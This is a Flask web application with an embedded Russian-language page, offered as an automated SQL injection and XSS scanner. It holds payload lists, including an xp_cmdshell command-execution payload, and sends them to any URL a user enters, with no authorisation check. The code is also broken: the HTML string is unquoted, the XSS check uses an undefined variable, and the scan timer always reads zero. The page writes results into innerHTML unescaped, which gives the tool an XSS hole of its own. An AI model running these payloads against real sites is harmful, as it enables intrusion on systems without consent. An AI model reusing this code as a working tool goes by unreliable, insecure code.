from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import time
import threading
import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import re
import random

app = Flask(__name__)
CORS(app)

# Глобальные переменные
current_scan_status = {"is_scanning": False, "progress": 0, "results": None, "scan_id": "", "current_target": "", "scan_type": ""}
scan_counter = 1
# 🔥 30+ PAYLOADS для SQLi и XSS
SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a",
    "') OR ('1'='1", "' UNION SELECT 1,2,3--", "admin'--",
    "1' ORDER BY 1--", "'; WAITFOR DELAY '0:0:5'--",
    "' OR 'x'='x", "1' GROUP BY 1--", "' UNION SELECT username,password FROM users--",
    "\\'", '\\"', "\\\" OR \\\"1\\\"=\\\"1", "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' OR 1=1#", "1' ORDER BY 1#", "' UNION SELECT 1,2,3#"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg onload=alert(1)>",
    "'><script>alert(1)</script>", "\"><script>alert(1)</script>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>"
]

SQL_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"warning.*mysql", r"unclosed quotation",
    r"quoted string not properly", r"ora-", r"postgresql", r"sqlite",
    r"microsoft ole db", r"odbc.*sql", r"pg_query", r"you have an error"
]
class RealScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def scan_url(self, url):
        """🎯 Полное сканирование SQLi + XSS"""
        print(f"🔍 Scanning: {url}")
        
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return {"success": False, "error": "Неверный URL"}
            
            if not parsed.query:
                return {
                    "success": True, "url": url, "vulnerabilities_found": 0,
                    "issues": [], "message": "Параметры не найдены (?id=1)"
                }
            
            # Парсим параметры
            params = parse_qs(parsed.query)
            results = []
            total_tests = 0
            tested = 0
            
            # SQLi тест
            for param_name in list(params.keys())[:3]:  # Первые 3 параметра
                for payload in SQLI_PAYLOADS[:5]:  # Первые 5 payloads
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', test_query, ''))
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=8)
                        elapsed = time.time() - start_time
                        
                        is_sqli = self.check_sql_injection(response)
                        
                        results.append({
                            "type": "SQL Injection",
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "is_vulnerable": is_sqli,
                            "response_time": round(elapsed, 2),
                            "status": response.status_code
                        })
                        
                        tested += 1
                        progress = min(90, (tested * 100) // 20)  # До 90%
                        current_scan_status["progress"] = progress
                        
                        time.sleep(random.uniform(0.3, 0.8))
                        
                    except Exception:
                        results.append({
                            "type": "SQL Injection", "parameter": param_name,
                            "payload": payload, "is_vulnerable": False
                        })
            
            # XSS тест (10%)
            current_scan_status["progress"] = 90
            time.sleep(1)
            
            for param_name in list(params.keys())[:2]:
                for payload in XSS_PAYLOADS[:3]:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', test_query, ''))
                    
                    try:
                        response = self.session.get(test_url, timeout=5)
                        is_xss = self.check_xss(response.text, payload)
                        
                        results.append({
                            "type": "XSS",
                            "parameter": param_name,
                            "payload": payload[:50] + "..." if len(payload) > 50 else payload,
                            "is_vulnerable": is_xss,
                            "status": response.status_code
                        })
                        
                    except Exception:
                        pass
            
            # Финальные результаты
            vulnerabilities = [r for r in results if r["is_vulnerable"]]
            
            scan_result = {
                "success": True,
                "url": url,
                "parameters": list(params.keys()),
                "vulnerabilities_found": len(vulnerabilities),
                "total_tests": len(results),
                "issues": vulnerabilities[:10],  # Топ 10
                "results": results,
                "scan_time": time.time() - time.time()
            }
            
            current_scan_status["progress"] = 100
            print(f"✅ Scan complete: {len(vulnerabilities)} vulnerabilities")
            return scan_result
            
        except Exception as e:
            current_scan_status["progress"] = 100
            return {"success": False, "error": str(e)}

    def check_sql_injection(self, response):
        """Проверка SQL ошибок"""
        if response.status_code in [500, 403]:
            return True
            
        text = response.text.lower()
        return any(re.search(pattern, text, re.IGNORECASE) for pattern in SQL_ERROR_PATTERNS)

    def check_xss(self, text, payload):
        """Проверка XSS отражения"""
        return payload.lower() in text.lower() and response.status_code < 400

scanner = RealScanner()
@app.route('/')
def index():
    return HTML_CONTENT

@app.route('/api/scan_web', methods=['POST'])
def scan_web():
    global current_scan_status, scan_counter
    
    print("📡 Scan request received")
    
    if current_scan_status["is_scanning"]:
        return jsonify({"error": "Already scanning"}), 409

    data = request.get_json()
    url = data.get('url', '').strip()
    
    if not url:
        return jsonify({"error": "Enter URL"}), 400

    current_scan_status.update({
        "is_scanning": True, "progress": 0, "results": None,
        "scan_id": f"scan-{scan_counter}", "current_target": url
    })
    scan_counter += 1
    
    def run_scan():
        try:
            result = scanner.scan_url(url)
            current_scan_status.update({
                "results": result, "progress": 100, "is_scanning": False
            })
            print(f"✅ Scan complete: {result.get('vulnerabilities_found', 0)} vulns")
        except Exception as e:
            print(f"❌ Scan error: {e}")
            current_scan_status.update({
                "results": {"success": False, "error": str(e)},
                "is_scanning": False
            })
    
    threading.Thread(target=run_scan, daemon=True).start()
    return jsonify({"message": "Scan started", "scan_id": current_scan_status["scan_id"]})

@app.route('/api/scan_status')
def scan_status():
    return jsonify(current_scan_status)

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    current_scan_status["is_scanning"] = False
    return jsonify({"message": "Stopped"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
HTML_CONTENT = 
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ SQLi + XSS Сканер</title>
    <style>
        * {margin:0;padding:0;box-sizing:border-box}
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh; padding: 20px; color: #333 
        }
        .container {
            max-width: 1000px; margin: 0 auto; 
            background: rgba(255,255,255,0.95); 
            border-radius: 25px; box-shadow: 0 25px 50px rgba(0,0,0,0.15); 
            padding: 40px; backdrop-filter: blur(15px); 
            position: relative; overflow: hidden;
        }
        .container::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; 
            height: 5px; background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #f9ca24);
        }
        h1 { 
            text-align: center; color: #2c3e50; font-size: 3em; 
            margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.1);
            background: linear-gradient(45deg, #2c3e50, #3498db); 
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            text-align: center; color: #7f8c8d; font-size: 1.2em; 
            margin-bottom: 40px; font-weight: 300;
        }
        .input-group {
            display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 30px; align-items: end;
        }
        #urlInput {
            flex: 1; min-width: 350px; padding: 20px 25px; 
            border: 3px solid #ecf0f1; border-radius: 15px; font-size: 16px;
            transition: all 0.3s ease; background: #fafbfc;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
        }
        #urlInput:focus {
            outline: none; border-color: #3498db; box-shadow: 0 10px 25px rgba(52,152,219,0.2);
            transform: translateY(-2px);
        }
        button {
            padding: 20px 35px; border: none; border-radius: 15px; 
            cursor: pointer; font-size: 16px; font-weight: 600;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        .scan-btn { 
            background: linear-gradient(45deg, #28a745, #20c997); 
            color: white; min-width: 160px;
        }
        .scan-btn:hover { 
            transform: translateY(-3px) scale(1.05); 
            box-shadow: 0 15px 35px rgba(40,167,69,0.4);
        }
        .stop-btn { 
            background: linear-gradient(45deg, #dc3545, #e74c3c); 
            color: white; min-width: 160px; display: none;
        }
        .stop-btn:hover { 
            transform: translateY(-3px) scale(1.05); 
            box-shadow: 0 15px 35px rgba(220,53,69,0.4);
        }
        .progress-container {
            margin: 30px 0; display: none;
        }
        .progress-bar {
            width: 100%; height: 12px; background: #ecf0f1; 
            border-radius: 25px; overflow: hidden; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
        }
        .progress-fill {
            height: 100%; background: linear-gradient(90deg, #28a745, #20c997); 
            width: 0%; transition: width 0.5s ease; border-radius: 25px;
            box-shadow: 0 0 20px rgba(40,167,69,0.5);
            position: relative; overflow: hidden;
        }
        .progress-fill::after {
            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: shimmer 2s infinite;
        }
        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        .progress-text {
            text-align: center; margin-top: 15px; font-size: 1.3em; 
            font-weight: 600; color: #2c3e50;
        }
        .status {
            padding: 20px; margin: 20px 0; border-radius: 15px; 
            text-align: center; font-weight: 500; display: none;
        }
        .status.success { background: #d4edda; color: #155724; border: 2px solid #c3e6cb; }
        .status.error { background: #f8d7da; color: #721c24; border: 2px solid #f5c6cb; }
        .results {
            margin-top: 30px; padding: 30px; background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            border-radius: 20px; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .vuln-count {
            text-align: center; font-size: 2.5em; font-weight: 700; margin-bottom: 25px;
        }
        .vuln-high { background: linear-gradient(45deg, #dc3545, #e74c3c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .vuln-medium { background: linear-gradient(45deg, #fd7e14, #f39c12); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .vuln-low { background: linear-gradient(45deg, #ffc107, #f1c40f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .vuln-list { display: grid; gap: 15px; }
        .vuln-item {
            background: white; padding: 20px; border-radius: 15px; 
            border-left: 5px solid #3498db; box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            transition: all 0.3s ease;
        }
        .vuln-item:hover { transform: translateX(10px); box-shadow: 0 10px 30px rgba(0,0,0,0.15); }
        .vuln-header { font-weight: 600; color: #2c3e50; margin-bottom: 8px; }
        .vuln-payload { 
            background: #e9ecef; padding: 8px 12px; border-radius: 8px; 
            font-family: 'Courier New', monospace; font-size: 0.9em; color: #495057;
            word-break: break-all; margin: 5px 0;
        }
        .vuln-url { color: #6c757d; font-size: 0.9em; word-break: break-all; }
        @media (max-width: 768px) {
            .container { padding: 25px 20px; margin: 10px; }
            h1 { font-size: 2em; }
            .input-group { flex-direction: column; }
            #urlInput { min-width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ SQLi + XSS Сканер</h1>
        <p class="subtitle">Автоматическое обнаружение SQL-инъекций и XSS уязвимостей</p>
        
        <div class="input-group">
            <input type="url" id="urlInput" placeholder="https://testphp.vulnweb.com/artists.php?artist=1">
            <button class="scan-btn" onclick="startScan()">🚀 Сканировать</button>
            <button class="stop-btn" onclick="stopScan()">⏹️ Остановить</button>
        </div>
        
        <div id="status" class="status"></div>
        <div id="progressContainer" class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div id="progressText" class="progress-text">0%</div>
        </div>
        
        <div id="results" class="results"></div>
    </div>

    <script>
        let pollingInterval;

        async function startScan() {
            const url = document.getElementById('urlInput').value.trim();
            if (!url) {
                showStatus('⚠️ Введите URL для сканирования!', 'error');
                return;
            }

            // UI состояния
            document.querySelector('.scan-btn').style.display = 'none';
            document.querySelector('.stop-btn').style.display = 'inline-block';
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('results').style.display = 'none';
            showStatus('🚀 Запуск сканирования...', 'success');

            try {
                const response = await fetch('/api/scan_web', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: url})
                });
                
                if (!response.ok) {
                    const error = await response.json();
                    showStatus(`❌ Ошибка: ${error.error || 'Неизвестная ошибка'}`, 'error');
                    resetUI();
                    return;
                }

                const data = await response.json();
                if (data.scan_id) {
                    pollStatus();
                }
            } catch (error) {
                showStatus('❌ Ошибка сети! Проверьте подключение.', 'error');
                resetUI();
            }
        }

        async function pollStatus() {
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch('/api/scan_status');
                    const status = await response.json();

                    // Прогресс
                    document.getElementById('progressFill').style.width = status.progress + '%';
                    document.getElementById('progressText').textContent = status.progress + '%';

                    if (!status.is_scanning && status.progress === 100) {
                        clearInterval(pollingInterval);
                        if (status.results) {
                            displayResults(status.results);
                        }
                        resetUI();
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 500);
        }

        function displayResults(results) {
            const resultsDiv = document.getElementById('results');
            
            if (!results.success) {
                resultsDiv.innerHTML = `
                    <div class="vuln-count" style="color: #6c757d;">
                        ❌ Ошибка сканирования: ${results.error}
                    </div>
                `;
            } else if (results.vulnerabilities_found === 0) {
                resultsDiv.innerHTML = `
                    <div class="vuln-count" style="color: #28a745;">
                        🟢 ${results.vulnerabilities_found} уязвимостей
                    </div>
                    <p style="text-align: center; color: #6c757d; font-size: 1.1em;">
                        Отлично! Критических уязвимостей не найдено.
                    </p>
                    ${results.message ? `<p>${results.message}</p>` : ''}
                `;
            } else {
                resultsDiv.innerHTML = `
                    <div class="vuln-count vuln-high">
                        🔴 ${results.vulnerabilities_found} уязвимостей
                    </div>
                    <div class="vuln-list">
                        ${results.issues.map(issue => `
                            <div class="vuln-item">
                                <div class="vuln-header">
                                    ${issue.type} <span style="color: #6c757d;">(${issue.severity || 'High'})</span>
                                </div>
                                ${issue.parameter ? `<div>Параметр: <strong>${issue.parameter}</strong></div>` : ''}
                                ${issue.payload ? `<div class="vuln-payload">${issue.payload}</div>` : ''}
                                ${issue.url ? `<div class="vuln-url">URL: ${issue.url}</div>` : ''}
                            </div>
                        `).join('')}
                    </div>
                `;
            }
            resultsDiv.style.display = 'block';
        }

        function resetUI() {
            document.querySelector('.scan-btn').style.display = 'inline-block';
            document.querySelector('.stop-btn').style.display = 'none';
        }

        function stopScan() {
            fetch('/api/stop_scan', {method: 'POST'});
            clearInterval(pollingInterval);
            resetUI();
            showStatus('⏹️ Сканирование остановлено', 'error');
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.style.display = 'block';
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 4000);
        }

        // Enter для запуска
        document.getElementById('urlInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') startScan();
        });

        // Примеры
        document.getElementById('urlInput').placeholder = 'https://testphp.vulnweb.com/artists.php?artist=1';
    </script>
</body>
</html>
